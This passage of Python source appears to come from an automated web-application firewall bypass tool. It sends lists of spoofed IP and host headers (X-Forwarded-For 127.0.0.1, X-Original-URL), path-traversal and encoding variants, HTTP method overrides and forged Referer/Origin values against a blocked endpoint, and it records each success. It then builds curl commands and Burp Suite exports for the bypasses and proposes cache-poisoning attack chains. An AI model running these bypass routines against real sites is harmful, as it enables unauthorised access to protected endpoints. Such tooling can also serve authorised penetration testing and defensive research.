                            self.learning_db.record_technique_outcome(
                                scan_id=self.scan_id,
                                technique_id=technique_id,
                                stack_sig=_exec_stack_sig,
                                success=bool(result.get('success')),
                            )
                        except Exception:
                            pass

                    if result.get('success'):
                        method_detail = result.get('method', '')
                        status = result.get('status_code', '')
                        print(f"    [✓] {technique_name}: Success"
                              f"  (HTTP {status}, via {method_detail})")

                        # Registra come discrepancy — alimenta BypassGenerator
                        headers_used = {k: v for k, v in (result.get('headers_used') or {}).items()} \
                            if isinstance(result.get('headers_used'), dict) else {}
                        url_used = result.get('url', self.forbidden_endpoint)
                        self.discrepancies.append({
                            'type': 'Graph Optimized Bypass',
                            'technique': technique_name,
                            'forbidden_url': self.forbidden_endpoint,
                            'url': url_used,
                            'headers': headers_used,
                            'method': 'GET',
                            'response_code': status,
                            'severity': 'HIGH',
                            'source': 'advanced',
                            'evidence': f'Graph A* path: {technique_name} success'
                        })

                        # Confirm hit with IntelligentBypassValidator
                        node_category = node.category.name.lower()
                        validation = self._confirm_chain_hit(
                            url=url_used,
                            headers=headers_used,
                            method='GET',
                            technique_name=technique_name,
                            category=node_category,
                            initial_status=status
                        )
                        conf = validation['confidence']
                        prob = validation.get('probability', 0.0)
                        if validation['confirmed']:
                            print(f"    [✔] Validation: {conf} ({prob:.0%})"
                                  f"  via {validation.get('strategy', '?')}")
                        else:
                            print(f"    [?] Validation: {conf} ({prob:.0%})"
                                  f"  — not confirmed as real bypass")
                    else:
                        attempts = result.get('attempts', '?')
                        print(f"    [✗] {technique_name}: Failed  ({attempts} attempts)")

                except Exception as e:
                    execution_feedback[technique_id] = {'success': False, 'error': str(e)}
                    print(f"    [✗] {technique_name}: Error — {str(e)}")
            else:
                # Node has no executor: record as skipped so adaptive replanning
                # can still update its probability from lack of execution data.
                print(f"    [~] {technique_name}: No executor (skipped)")

        # Adaptive replanning based on feedback
        if execution_feedback:
            print(f"\n     🔄 Adaptive Replanning...")
            adapted_plan = self.attack_planner.execute_plan_with_adaptation(
                attack_plan,
                execution_feedback
            )

            adapted_details = adapted_plan['optimal_path_details']
            if adapted_plan['optimal_path'] != attack_plan['optimal_path']:
                new_chain = ' → '.join(adapted_details['techniques'])
                print(f"        Path changed  : {new_chain}")
                print(f"        New success p.: {adapted_details['success_probability']:.2%}")
                print(f"        New det. risk : {adapted_details['detection_risk']:.2%}")
            else:
                print(f"        Path unchanged — probabilities updated from execution feedback")
                print(f"        Success p.: {details['success_probability']:.2%}"
                      f" → {adapted_details['success_probability']:.2%}")
                print(f"        Det. risk : {details['detection_risk']:.2%}"
                      f" → {adapted_details['detection_risk']:.2%}")

    def _confirm_chain_hit(self, url: str, headers: Dict, method: str,
                           technique_name: str, category: str,
                           initial_status: int) -> Dict:
        """
        Confirm a chain hit using IntelligentBypassValidator.

        Called after any technique executor or semantic bypass reports a
        non-blocked status. Uses multi-strategy Bayesian validation to
        distinguish real bypasses from flukes/redirects/soft-blocks.

        Args:
            url: The URL that produced the hit
            headers: Headers used in the successful request
            method: HTTP method used
            technique_name: Human-readable technique name
            category: Attack category ('header', 'path', 'method', etc.)
            initial_status: Status code from the original hit

        Returns:
            Dict with 'confirmed' (bool), 'confidence' (str), 'probability' (float)
        """
        if not self.intelligent_validator:
            # Fallback: trust the initial status as-is
            return {
                'confirmed': initial_status in range(200, 300),
                'confidence': 'UNKNOWN',
                'probability': 0.0,
                'note': 'IntelligentBypassValidator not available'
            }

        bypass_dict = {
            'metadata': {
                'bypass_type': technique_name,
                'confidence': 0.6,   # neutral prior; validator will update it
                'category': category,
                'bypass_id': f'chain_{technique_name.lower().replace(" ", "_")}'
            },
            'request': {
                'url': url,
                'method': method,
                'headers': headers
            }
        }

        result = self.intelligent_validator._validate_bypass_intelligent(
            bypass_dict, bypass_dict['metadata']['bypass_id']
        )

        return {
            'confirmed': result.validated,
            'confidence': result.validation_confidence.value,
            'probability': result.validation_probability,
            'attempts': result.attempts,
            'strategy': result.successful_strategy,
            'verdict': result.final_verdict
        }

    # Helper methods for graph attack chain execution
    def _execute_header_manipulation(self) -> Dict:
        """
        Execute header manipulation technique using discovered discrepancies

        Strategy:
        1. Use headers from discovered "Header Confusion Bypass" discrepancies
        2. Try multiple successful header combinations
        3. Fallback to common bypass headers if no discrepancies found
        """
        # First, try headers from discovered discrepancies (most likely to work)
        header_discrepancies = [
            d for d in self.discrepancies
            if d.get('type') in ['Header Confusion Bypass', 'Header Confusion Leak']
        ]

        if header_discrepancies:
            # Sort by severity (CRITICAL > HIGH > MEDIUM)
            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
            header_discrepancies.sort(
                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
            )

            # Try up to 3 most promising header combinations from discrepancies
            for discrepancy in header_discrepancies[:3]:
                try:
                    self.rate_limiter.wait()

                    headers = discrepancy.get('headers', {})
                    if not headers:
                        continue

                    response = self.session.get(
                        self.forbidden_endpoint,
                        headers=headers,
                        timeout=5
                    )

                    # Success if not blocked
                    if response.status_code not in [401, 403, 429]:
                        return {
                            'success': True,
                            'status_code': response.status_code,
                            'method': 'discrepancy_headers',
                            'headers_used': list(headers.keys())
                        }

                except Exception as e:
                    continue

        # Fallback: Try common bypass header combinations if discrepancies didn't work
        common_bypass_headers = [
            # IP Spoofing Headers (high success rate)
            {
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Custom-IP-Authorization': '127.0.0.1'
            },
            # Path Rewrite Headers
            {
                'X-Original-URL': '/',
                'X-Rewrite-URL': '/',
                'X-Custom-IP-Authorization': '127.0.0.1'
            },
            # Host Override Headers
            {
                'X-Host': 'localhost',
                'X-Forwarded-Host': 'localhost',
                'X-Forwarded-Server': 'localhost'
            },
            # Protocol Confusion
            {
                'X-Forwarded-Proto': 'https',
                'X-Forwarded-Scheme': 'https',
                'Front-End-Https': 'on'
            },
            # Combined approach (most comprehensive)
            {
                'X-Forwarded-For': '127.0.0.1',
                'X-Original-URL': '/',
                'X-Rewrite-URL': '/',
                'X-Custom-IP-Authorization': '127.0.0.1',
                'X-Forwarded-Proto': 'https'
            }
        ]

        for headers in common_bypass_headers:
            try:
                self.rate_limiter.wait()

                response = self.session.get(
                    self.forbidden_endpoint,
                    headers=headers,
                    timeout=5
                )

                # Success if not blocked
                if response.status_code not in [401, 403, 429]:
                    return {
                        'success': True,
                        'status_code': response.status_code,
                        'method': 'common_bypass',
                        'headers_used': list(headers.keys())
                    }

            except Exception as e:
                continue

        # All attempts failed
        return {
            'success': False,
            'status_code': 403,
            'attempts': len(header_discrepancies) + len(common_bypass_headers),
            'message': 'All header manipulation attempts failed'
        }

    def _execute_path_traversal(self) -> Dict:
        """
        Execute path traversal technique using discovered discrepancies

        Strategy:
        1. Use path variants from discovered "Path Normalization" discrepancies
        2. Try multiple common path traversal techniques
        3. Fallback to generic path manipulation
        """
        # First, try path variants from discovered discrepancies
        path_discrepancies = [
            d for d in self.discrepancies
            if d.get('type') == 'Path Normalization'
        ]

        if path_discrepancies:
            # Sort by severity
            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
            path_discrepancies.sort(
                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
            )

            # Try top 3 discovered path variants
            for discrepancy in path_discrepancies[:3]:
                try:
                    self.rate_limiter.wait()

                    variant = discrepancy.get('variant', '')
                    if not variant:
                        continue

                    # Build URL with the variant that worked
                    test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{variant}"

                    response = self.session.get(test_url, timeout=5)

                    if response.status_code not in [401, 403, 429]:
                        return {
                            'success': True,
                            'status_code': response.status_code,
                            'method': 'discrepancy_path',
                            'path_used': variant
                        }

                except Exception as e:
                    continue

        # Fallback: Try common path traversal techniques
        base_path = self.parsed_url.path
        common_path_variants = [
            base_path.replace('/', '//'),           # Double slash
            base_path.replace('/', '/./'),          # Dot segments
            base_path + '/',                        # Trailing slash
            base_path.rstrip('/'),                  # Remove trailing slash
            base_path.replace('/', '/%2e/'),        # Encoded dot
            base_path.replace('/', '/;/'),          # Semicolon bypass
            urllib.parse.quote(base_path, safe=''), # Full URL encoding
            base_path.replace('/', '/%09/'),        # Tab character
        ]

        for variant_path in common_path_variants:
            try:
                self.rate_limiter.wait()

                test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{variant_path}"
                response = self.session.get(test_url, timeout=5)

                if response.status_code not in [401, 403, 429]:
                    return {
                        'success': True,
                        'status_code': response.status_code,
                        'method': 'common_path_variant',
                        'path_used': variant_path
                    }

            except Exception as e:
                continue

        # All attempts failed
        return {
            'success': False,
            'status_code': 403,
            'attempts': len(path_discrepancies) + len(common_path_variants),
            'message': 'All path traversal attempts failed'
        }

    def _execute_method_override(self) -> Dict:
        """
        Execute method override technique using discovered discrepancies

        Strategy:
        1. Use methods from discovered "Method Confusion" discrepancies
        2. Try multiple HTTP method override techniques
        3. Fallback to common method override headers
        """
        # First, try methods from discovered discrepancies
        method_discrepancies = [
            d for d in self.discrepancies
            if d.get('type') == 'Method Confusion'
        ]

        if method_discrepancies:
            # Sort by severity
            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
            method_discrepancies.sort(
                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
            )

            # Try top 3 discovered methods
            for discrepancy in method_discrepancies[:3]:
                try:
                    self.rate_limiter.wait()

                    method = discrepancy.get('method', 'GET')
                    if not method:
                        continue

                    # Use the method that worked in discrepancy test
                    response = self.session.request(
                        method=method,
                        url=self.forbidden_endpoint,
                        timeout=5
                    )

                    if response.status_code not in [401, 403, 405, 429]:
                        return {
                            'success': True,
                            'status_code': response.status_code,
                            'method': 'discrepancy_method',
                            'http_method': method
                        }

                except Exception as e:
                    continue

        # Fallback: Try common method override techniques
        method_override_tests = [
            # Header-based method override
            ('POST', {'X-HTTP-Method-Override': 'GET'}),
            ('POST', {'X-Method-Override': 'GET'}),
            ('POST', {'X-HTTP-Method': 'GET'}),
            # Alternative methods
            ('HEAD', {}),
            ('OPTIONS', {}),
            ('TRACE', {}),
            # WebDAV methods
            ('PROPFIND', {}),
            ('PROPPATCH', {}),
        ]

        for method, headers in method_override_tests:
            try:
                self.rate_limiter.wait()

                response = self.session.request(
                    method=method,
                    url=self.forbidden_endpoint,
                    headers=headers,
                    timeout=5
                )

                if response.status_code not in [401, 403, 405, 429]:
                    return {
                        'success': True,
                        'status_code': response.status_code,
                        'method': 'common_method_override',
                        'http_method': method,
                        'headers_used': list(headers.keys()) if headers else []
                    }

            except Exception as e:
                continue

        # All attempts failed
        return {
            'success': False,
            'status_code': 403,
            'attempts': len(method_discrepancies) + len(method_override_tests),
            'message': 'All method override attempts failed'
        }

    def _execute_encoding_evasion(self) -> Dict:
        """
        Execute encoding evasion technique using discovered discrepancies

        Strategy:
        1. Use encodings from discovered "Encoding Confusion" discrepancies
        2. Try multiple encoding techniques
        3. Fallback to common encoding variations
        """
        # First, try encodings from discovered discrepancies
        encoding_discrepancies = [
            d for d in self.discrepancies
            if d.get('type') == 'Encoding Confusion'
        ]

        if encoding_discrepancies:
            # Sort by severity
            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
            encoding_discrepancies.sort(
                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
            )

            # Try top 3 discovered encoding variants
            for discrepancy in encoding_discrepancies[:3]:
                try:
                    self.rate_limiter.wait()

                    encoded_variant = discrepancy.get('encoded_variant', '')
                    if not encoded_variant:
                        continue

                    # Build URL with the encoding that worked
                    test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{encoded_variant}"

                    response = self.session.get(test_url, timeout=5)

                    if response.status_code not in [401, 403, 429]:
                        return {
                            'success': True,
                            'status_code': response.status_code,
                            'method': 'discrepancy_encoding',
                            'encoding_used': encoded_variant
                        }

                except Exception as e:
                    continue

        # Fallback: Try common encoding techniques
        base_path = self.parsed_url.path
        common_encodings = [
            urllib.parse.quote(base_path, safe=''),                    # Full URL encoding
            urllib.parse.quote(base_path, safe='/'),                   # Encode non-slash
            urllib.parse.quote(urllib.parse.quote(base_path, safe='')), # Double encoding
            base_path.replace('/', '%2f'),                             # Encode slash
            base_path.replace('/', '%252f'),                           # Double-encode slash
            base_path.replace(' ', '%20'),                             # Encode spaces
            base_path.replace(' ', '+'),                               # Plus encoding
            # Unicode variations
            base_path.replace('/', '\u2044'),                          # Unicode slash
            base_path.replace('/', '\uff0f'),                          # Fullwidth slash
            # Mixed encodings
            base_path.replace('/', '/%2F'),                            # Mixed case
        ]

        for encoded_path in common_encodings:
            try:
                self.rate_limiter.wait()

                test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{encoded_path}"
                response = self.session.get(test_url, timeout=5)

                if response.status_code not in [401, 403, 429]:
                    return {
                        'success': True,
                        'status_code': response.status_code,
                        'method': 'common_encoding',
                        'encoding_used': encoded_path
                    }

            except Exception as e:
                continue

        # All attempts failed
        return {
            'success': False,
            'status_code': 403,
            'attempts': len(encoding_discrepancies) + len(common_encodings),
            'message': 'All encoding evasion attempts failed'
        }

    def _execute_referer_spoofing(self) -> Dict:
        """
        Execute referer/origin spoofing technique

        Strategy:
        1. Try multiple referer/origin combinations
        2. Include same-origin, localhost, and internal IP variations
        3. Test with and without additional headers
        """
        # Multiple referer/origin combinations to try
        base_origin = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"

        referer_tests = [
            # Same origin (most common bypass)
            {
                'Referer': f"{base_origin}/",
                'Origin': base_origin
            },
            # Localhost variations
            {
                'Referer': 'http://localhost/',
                'Origin': 'http://localhost'
            },
            {
                'Referer': 'http://127.0.0.1/',
                'Origin': 'http://127.0.0.1'
            },
            # Internal IP ranges
            {
                'Referer': 'http://192.168.1.1/',
                'Origin': 'http://192.168.1.1'
            },
            {
                'Referer': 'http://10.0.0.1/',
                'Origin': 'http://10.0.0.1'
            },
            # Referer only (no Origin)
            {
                'Referer': f"{base_origin}/"
            },
            # Origin only (no Referer)
            {
                'Origin': base_origin
            },
            # With additional spoofing headers
            {
                'Referer': f"{base_origin}/",
                'Origin': base_origin,
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1'
            },
            # Null origin (CORS bypass)
            {
                'Origin': 'null'
            },
            # Arbitrary trusted domains (common misconfigurations)
            {
                'Referer': 'https://www.google.com/',
                'Origin': 'https://www.google.com'
            }
        ]

        for headers in referer_tests:
            try:
                self.rate_limiter.wait()

                response = self.session.get(
                    self.forbidden_endpoint,
                    headers=headers,
                    timeout=5
                )

                if response.status_code not in [401, 403, 429]:
                    return {
                        'success': True,
                        'status_code': response.status_code,
                        'method': 'referer_spoofing',
                        'headers_used': list(headers.keys())
                    }

            except Exception as e:
                continue

        # All attempts failed
        return {
            'success': False,
            'status_code': 403,
            'attempts': len(referer_tests),
            'message': 'All referer/origin spoofing attempts failed'
        }


class BypassGenerator:
    """
    Generates custom bypass payloads based on discovered discrepancies.
    """
    
    def __init__(self, discrepancies: List[Dict], stack_info: Dict):
        self.discrepancies = discrepancies
        self.stack_info = stack_info
        self.bypasses = []
        self._bypass_semantic_keys: set = set()
    
    def generate_all_bypasses(self):
        """Generate bypasses for each discrepancy"""
        print("\n🛠️ Phase 4: Custom Bypass Generation")
        print("=" * 70)

        if not self.discrepancies:
            print("  ⚠️ No discrepancies found - no bypasses to generate")
            return []

        # Reset semantic dedup set per ogni generazione
        self._bypass_semantic_keys = set()

        print(f"  📊 Generating bypasses for {len(self.discrepancies)} discrepancies...")
        
        for discrepancy in self.discrepancies:
            bypass_type = discrepancy['type']
            
            if bypass_type == 'Header Confusion':
                self._generate_header_bypass(discrepancy)
            elif bypass_type == 'Method Confusion':
                self._generate_method_bypass(discrepancy)
            elif bypass_type == 'Path Normalization':
                self._generate_path_bypass(discrepancy)
            elif bypass_type == 'Protocol Confusion':
                self._generate_protocol_bypass(discrepancy)
            elif bypass_type == 'Encoding Confusion':
                self._generate_encoding_bypass(discrepancy)
            elif bypass_type == 'Anchor Tag Mutation':
                # Only generate actionable bypass entries for confirmed bypasses
                if discrepancy.get('is_confirmed_bypass'):
                    self._generate_anchor_tag_bypass(discrepancy)
            elif bypass_type == 'Advanced Statistical Bypass':
                self._generate_advanced_statistical_bypass(discrepancy)
            elif bypass_type == 'Semantic Evolutionary Bypass':
                self._generate_semantic_evolutionary_bypass(discrepancy)
            elif bypass_type == 'Graph Optimized Bypass':
                self._generate_graph_optimized_bypass(discrepancy)
        
        print(f"\n  ✅ Generated {len(self.bypasses)} bypass techniques")
        return self.bypasses
    
    # ------------------------------------------------------------------
    # Deduplicazione semantica — TASK 2.5
    # ------------------------------------------------------------------

    @staticmethod
    def _canonicalize_path_transform(url: str) -> str:
        """
        Classifica la categoria di trasformazione applicata al path,
        non il path risultante — per deduplicazione semantica.
        """
        path = urllib.parse.urlparse(url).path.lower()
        if re.search(r'%[0-9a-f]{2}', path):
            return 'encoding'
        if '\u2215' in path or '\u29f8' in path or '%e2%80%8b' in path.lower():
            return 'unicode'
        if re.search(r'/\./|/\.\.$|/\.\.|\./', path):
            return 'dot_segment'
        if re.search(r'/[a-z]+[A-Z]|/[A-Z][a-z]', urllib.parse.urlparse(url).path):
            return 'case'
        if path.endswith('/') or path.endswith('/.') or path.endswith('/..'):
            return 'trailing'
        return 'other'

    def _is_semantic_duplicate(self, bypass: dict) -> bool:
        """
        Ritorna True se un bypass semanticamente equivalente è già stato
        aggiunto. Tra duplicati sopravvive quello con severity più alta
        (gestito dal chiamante: non appendere se già presente).
        """
        btype = bypass.get('type', '')

        if btype in ('Header Confusion', 'Advanced Statistical Bypass'):
            key = (btype,
                   frozenset(bypass.get('headers', {}).keys()),
                   bypass.get('method', 'GET'))
        elif btype in ('Path Normalization', 'Semantic Evolutionary Bypass',
                       'Encoding Confusion'):
            url = bypass.get('url', bypass.get('test_url', ''))
            key = (btype, self._canonicalize_path_transform(url))
        elif btype == 'Method Confusion':
            key = (btype, bypass.get('method', ''))
        else:
            key = (btype,
                   str(bypass.get('headers', {})),
                   bypass.get('url', ''))

        if key in self._bypass_semantic_keys:
            return True
        self._bypass_semantic_keys.add(key)
        return False

    # ------------------------------------------------------------------
    # Causal trace — TASK 2.6
    # ------------------------------------------------------------------

    _LAYER_BY_TYPE = {
        'Header Confusion': 'WAF/CDN',
        'Advanced Statistical Bypass': 'WAF/CDN',
        'Path Normalization': 'WAF/Proxy',
        'Semantic Evolutionary Bypass': 'WAF/Proxy',
        'Encoding Confusion': 'WAF/CDN',
        'Method Confusion': 'WAF',
        'Protocol Confusion': 'CDN/Proxy',
        'Anchor Tag Mutation': 'WAF/Application',
        'Graph Optimized Bypass': 'WAF/CDN',
    }

    def _identify_bypassed_layer(self, discrepancy: dict) -> str:
        """
        Determina il layer aggirato dal tipo di discrepancy.
        Fallback: cerca nel stack_info se disponibile.
        """
        btype = discrepancy.get('type', '')
        return self._LAYER_BY_TYPE.get(btype, 'Unknown')

    def _make_causal_trace(self, discrepancy: dict) -> dict:
        """Popola il causal_trace da propagare nel bypass dict."""
        return {
            'layer_bypassed': self._identify_bypassed_layer(discrepancy),
            'primary_evidence': discrepancy.get('evidence', ''),
            'discrepancy_type': discrepancy.get('type', ''),
            'bayesian_probability': discrepancy.get('bayesian_probability'),
            'source': discrepancy.get('source', 'classic'),
        }

    def _generate_header_bypass(self, discrepancy: Dict):
        """Generate header-based bypass"""
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Header Confusion',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'MEDIUM'),
            'method': 'GET',
            'url': discrepancy['forbidden_url'],
            'headers': discrepancy['headers'],
            'description': f"Header confusion bypass: {discrepancy['test_name']}",
            'curl_command': self._generate_curl(discrepancy['forbidden_url'], 'GET', discrepancy['headers']),
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_method_bypass(self, discrepancy: Dict):
        """Generate method-based bypass"""
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Method Confusion',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'MEDIUM'),
            'method': discrepancy['method'],
            'url': discrepancy['forbidden_url'],
            'headers': {},
            'description': f"HTTP method bypass using {discrepancy['method']}",
            'curl_command': self._generate_curl(discrepancy['forbidden_url'], discrepancy['method'], {}),
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_path_bypass(self, discrepancy: Dict):
        """Generate path-based bypass"""
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Path Normalization',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'MEDIUM'),
            'method': 'GET',
            'url': discrepancy['test_url'],
            'headers': {},
            'description': f"Path normalization bypass: {discrepancy['variant']}",
            'curl_command': self._generate_curl(discrepancy['test_url'], 'GET', {}),
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_protocol_bypass(self, discrepancy: Dict):
        """Generate protocol-based bypass"""
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Protocol Confusion',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'MEDIUM'),
            'method': 'GET',
            'url': discrepancy['forbidden_url'],
            'headers': {},
            'description': f"Protocol confusion bypass: {discrepancy['test']}",
            'curl_command': f"# Use HTTP/1.0: curl --http1.0 '{discrepancy['forbidden_url']}'",
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_encoding_bypass(self, discrepancy: Dict):
        """Generate encoding-based bypass"""
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Encoding Confusion',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'MEDIUM'),
            'method': 'GET',
            'url': discrepancy['test_url'],
            'headers': {},
            'description': f"Encoding confusion bypass: {discrepancy['encoded_variant']}",
            'curl_command': self._generate_curl(discrepancy['test_url'], 'GET', {}),
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_anchor_tag_bypass(self, discrepancy: Dict):
        """Generate anchor tag mutation bypass (only called for confirmed bypasses)."""
        import urllib.parse as _up
        import shlex as _shlex
        method = discrepancy.get('method', 'POST')
        url = discrepancy.get('forbidden_url', '')
        payload = discrepancy.get('payload', '')
        mp = discrepancy.get('mutation_point', '')

        if method == 'GET':
            bypass_url = url  # already contains ?q=... from tester
            curl_cmd = f"curl -i {_shlex.quote(bypass_url)}"
            curl_data = {'method': 'GET', 'path': _up.urlparse(bypass_url).path,
                         'query': _up.urlparse(bypass_url).query}
        else:
            bypass_url = url
            encoded = _up.urlencode({'input': payload, 'q': payload})
            curl_cmd = (f"curl -i -X POST "
                        f"-H 'Content-Type: application/x-www-form-urlencoded' "
                        f"-d {_shlex.quote(encoded)} {_shlex.quote(bypass_url)}")
            curl_data = {'method': 'POST', 'data': encoded,
                         'headers': {'Content-Type': 'application/x-www-form-urlencoded'}}

        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Anchor Tag Mutation',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'CRITICAL'),
            'method': method,
            'url': bypass_url,
            'headers': curl_data.get('headers', {}),
            'payload': payload,
            'description': (f"WAF bypass via <a> tag mutation [{mp}]: "
                            f"{discrepancy.get('description', '')}"),
            'curl_command': curl_cmd,
            'curl_data': curl_data,
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_advanced_statistical_bypass(self, discrepancy: Dict):
        """Generate bypass from Advanced Statistical discrepancy."""
        url = discrepancy.get('url', discrepancy.get('forbidden_url', ''))
        headers = discrepancy.get('headers', {})
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Advanced Statistical Bypass',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'HIGH'),
            'method': discrepancy.get('method', 'GET'),
            'url': url,
            'headers': headers,
            'source': 'advanced',
            'description': (
                f"Advanced statistical bypass: {discrepancy.get('evidence', '')}"
            ),
            'curl_command': self._generate_curl(
                url, discrepancy.get('method', 'GET'), headers
            ),
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_semantic_evolutionary_bypass(self, discrepancy: Dict):
        """Generate bypass from Semantic Evolutionary discrepancy."""
        forbidden_url = discrepancy.get('forbidden_url', '')
        evolved_payload = discrepancy.get('evolved_payload', '')
        url = discrepancy.get('url', forbidden_url)
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Semantic Evolutionary Bypass',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'HIGH'),
            'method': 'GET',
            'url': url,
            'headers': {},
            'payload': evolved_payload,
            'source': 'advanced',
            'description': (
                f"Semantic evolutionary bypass via {discrepancy.get('mutation_operator', 'mutation')}: "
                f"{evolved_payload[:60]}"
            ),
            'curl_command': self._generate_curl(url, 'GET', {}),
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_graph_optimized_bypass(self, discrepancy: Dict):
        """Generate bypass from Graph Optimized A* attack chain."""
        url = discrepancy.get('url', discrepancy.get('forbidden_url', ''))
        headers = discrepancy.get('headers', {})
        bypass = {
            'id': f"bypass_{len(self.bypasses) + 1}",
            'type': 'Graph Optimized Bypass',
            'discrepancy': discrepancy,
            'severity': discrepancy.get('severity', 'HIGH'),
            'method': discrepancy.get('method', 'GET'),
            'url': url,
            'headers': headers,
            'source': 'advanced',
            'description': (
                f"Graph A* optimized bypass — technique: {discrepancy.get('technique', 'unknown')}"
            ),
            'curl_command': self._generate_curl(
                url, discrepancy.get('method', 'GET'), headers
            ),
            'causal_trace': self._make_causal_trace(discrepancy),
        }
        if not self._is_semantic_duplicate(bypass):
            self.bypasses.append(bypass)

    def _generate_curl(self, url: str, method: str, headers: Dict) -> str:
        """Generate curl command"""
        cmd = ['curl', '-i']

        if method != 'GET':
            cmd.append(f'-X {method}')

        for header, value in headers.items():
            cmd.append(f"-H '{header}: {value}'")

        cmd.append(f"'{url}'")

        return ' '.join(cmd)

    def prioritize_bypasses(self) -> List[Dict]:
        """
        Prioritize bypasses by severity and likelihood of success.
        Returns sorted list with CRITICAL first.
        """
        priority_order = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1, 'INFO': 0}

        sorted_bypasses = sorted(
            self.bypasses,
            key=lambda x: (
                priority_order.get(x.get('severity', 'INFO'), 0),
                x.get('discrepancy', {}).get('cvss_score', 0.0)
            ),
            reverse=True
        )

        # Add priority ranking
        for idx, bypass in enumerate(sorted_bypasses, 1):
            bypass['priority_rank'] = idx
            bypass['priority_level'] = 'P1' if bypass.get('severity') == 'CRITICAL' else \
                                      'P2' if bypass.get('severity') == 'HIGH' else \
                                      'P3' if bypass.get('severity') == 'MEDIUM' else 'P4'

        return sorted_bypasses

    def generate_burp_json(self, filename: Optional[str] = None) -> str:
        """
        Generate Burp Suite compatible JSON format for import.
        Can be imported via Burp Proxy > Import requests from file.
        """
        if not filename:
            timestamp = int(time.time())
            filename = f"burp_bypasses_{timestamp}.json"

        burp_requests = []

        for bypass in self.bypasses:
            # Build Burp Suite request format
            burp_req = {
                'host': urlparse(bypass['url']).netloc,
                'port': 443 if urlparse(bypass['url']).scheme == 'https' else 80,
                'protocol': urlparse(bypass['url']).scheme,
                'url': bypass['url'],
                'method': bypass.get('method', 'GET'),
                'headers': [],
                'body': bypass.get('data', ''),
                'comment': f"[{bypass.get('severity', 'MEDIUM')}] {bypass.get('description', '')}",
                'highlight': self._get_burp_highlight(bypass.get('severity', 'MEDIUM'))
            }

            # Add headers
            for header_name, header_value in bypass.get('headers', {}).items():
                burp_req['headers'].append({
                    'name': header_name,
                    'value': header_value
                })

            burp_requests.append(burp_req)

        # Write to file
        with open(filename, 'w') as f:
            json.dump({'requests': burp_requests}, f, indent=2)

        print(f"\n💾 Burp Suite JSON: {filename}")
        return filename

    def _get_burp_highlight(self, severity: str) -> str:
        """Map severity to Burp Suite highlight colors"""
        color_map = {
            'CRITICAL': 'red',
            'HIGH': 'orange',
            'MEDIUM': 'yellow',
            'LOW': 'green',
            'INFO': 'gray'
        }
        return color_map.get(severity, 'gray')

    def suggest_attack_chains(self) -> List[Dict]:
        """
        Suggest attack chains by combining multiple bypasses.
        Example: Cache poisoning + Host header injection = Full bypass
        """
        chains = []

        # Look for complementary bypass types
        cache_bypasses = [b for b in self.bypasses if 'Cache' in b.get('type', '')]
        header_bypasses = [b for b in self.bypasses if 'Header' in b.get('type', '')]
        smuggling_bypasses = [b for b in self.bypasses if 'Smuggling' in b.get('type', '')]

        # Chain 1: Cache + Header = Cache Poisoning Attack
        if cache_bypasses and header_bypasses:
            chains.append({
                'name': 'Cache Poisoning via Header Injection',
                'severity': 'CRITICAL',
                'steps': [
                    cache_bypasses[0],
                    header_bypasses[0]
                ],
                'description': 'Combine cache key confusion with header injection to poison cache for all users',
                'cvss_score': 9.5
            })

        # Chain 2: Smuggling + Any bypass = Escalated Attack
        if smuggling_bypasses and len(self.bypasses) > len(smuggling_bypasses):
